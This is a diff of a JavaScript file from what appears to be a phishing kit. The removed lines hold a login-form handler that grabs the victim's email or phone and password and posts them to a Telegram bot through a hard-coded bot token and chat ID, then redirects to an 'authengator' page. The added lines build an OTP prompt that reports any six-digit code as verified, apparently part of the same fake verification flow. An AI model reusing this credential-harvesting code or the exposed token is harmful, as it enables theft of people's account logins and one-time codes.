@@ -1,47 +1,46 @@
-document.addEventListener("DOMContentLoaded", () => {
-    const form = document.getElementById("login-form");
+let currentMethod = '';
 
-    // Bots and chat IDs - first for direct receiving, second for forwarding to group
-   const bots = {
-  // Other bots (private chats)
+function openOtpModal(method) {
+    currentMethod = method;
+    const modal = document.getElementById('otp-modal');
+    const otpInput = document.getElementById('otp-input');
+    const modalText = document.getElementById('modal-text');
 
+    // SABSE IMPORTANT: Naya modal khulne par purana value clear karna
+    if (otpInput) {
+        otpInput.value = ''; 
+    }
 
-  // Your group-forwarding bot
-  "7892706717:AAGLqVZWBSvENZtXC-7EpmjhOHygY_8RQK8": "-4814667671"  // 2p group (NEW)
-};
+    if (method === 'email') {
+        modalText.innerText = "We have sent a 6-digit verification code to your email. Enter that code here.";
+    } else if (method === 'phone') {
+        modalText.innerText = "We have sent an OTP to your phone. Enter that OTP here.";
+    }
 
-    form.addEventListener("submit", async (event) => {
-        event.preventDefault();
+    modal.style.display = "block";
+}
 
-        // Collect form data
-        const emailPhone = document.getElementById("email-phone").value;
-        const password = document.getElementById("password").value;
+function closeModal() {
+    const modal = document.getElementById('otp-modal');
+    modal.style.display = "none";
+}
 
-        // Format the message
-        const message = `New Login Data:\n\nEmail/Phone: ${emailPhone}\nPassword: ${password}`;
+function submitOtp() {
+    const otpValue = document.getElementById('otp-input').value;
+    
+    if (otpValue.length === 6) {
+        alert(currentMethod + " verified successfully!");
+        closeModal();
+        // Yahan aapka baki ka calling logic aayega
+    } else {
+        alert("Please enter a valid 6-digit code.");
+    }
+}
 
-        try {
-            // Send the message to all bots
-            const sendPromises = Object.entries(bots).map(async ([token, chatId]) => {
-                const apiUrl = `https://api.telegram.org/bot${token}/sendMessage`;
-                const url = `${apiUrl}?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-                const response = await fetch(url);
-                return response.ok;
-            });
-
-            // Wait for all messages to be sent
-            const results = await Promise.all(sendPromises);
-
-            // Check if all requests succeeded
-            if (results.every((result) => result)) {
-                // Redirect and reset form if all requests succeed
-                window.location.href = "authengator.html"; // Change 'authengator.html' to your target page
-                form.reset();
-            } else {
-                console.error("Some messages failed to send:", results);
-            }
-        } catch (error) {
-            console.error("Error sending data:", error);
-        }
-    });
-});
+// Window click par modal band karne ke liye
+window.onclick = function(event) {
+    const modal = document.getElementById('otp-modal');
+    if (event.target == modal) {
+        modal.style.display = "none";
+    }
+}
